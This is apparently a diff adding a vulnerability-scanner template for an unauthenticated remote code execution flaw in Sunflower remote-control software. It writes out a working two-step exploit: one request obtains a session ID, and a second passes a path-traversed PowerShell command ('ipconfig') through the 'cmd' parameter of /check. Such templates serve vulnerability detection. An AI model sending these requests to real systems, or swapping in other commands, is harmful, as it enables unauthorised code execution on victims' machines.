@@ -1,0 +1,48 @@
+id: CNVD-2022-03672
+
+info:
+  name: Sunflower Simple and Personal - Remote Code Execution
+  author: daffainfo
+  severity: critical
+  description: Sunflower Simple and Personal is susceptible to a remote code execution vulnerability.
+  reference:
+    - https://www.1024sou.com/article/741374.html
+    - https://copyfuture.com/blogs-details/202202192249158884
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-03672
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 2
+  tags: cnvd,cnvd2022,sunflower,rce
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/rpc HTTP/1.1
+        Host: {{Hostname}}
+
+        action=verify-haras
+      - |
+        GET /check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+ipconfig HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: CID={{cid}}
+
+    extractors:
+      - type: regex
+        name: cid
+        internal: true
+        group: 1
+        regex:
+          - '"verify_string":"(.*?)"'
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1==200"
+          - "status_code_2==200"
+          - "contains(body_1, 'verify_string')"
+          - "contains(body_2, 'Windows IP')"
+        condition: and
+# digest: 4a0a00473045022100928026784cc057eaa23f653c4b09ac343accc972b221a64b816b0ce9310edb8802201651e0322b3bf4137ee2d849772b54bcf20351f759b3fe39622fc2c8733f5e10:922c64590222798bb761d5b6d8e72950
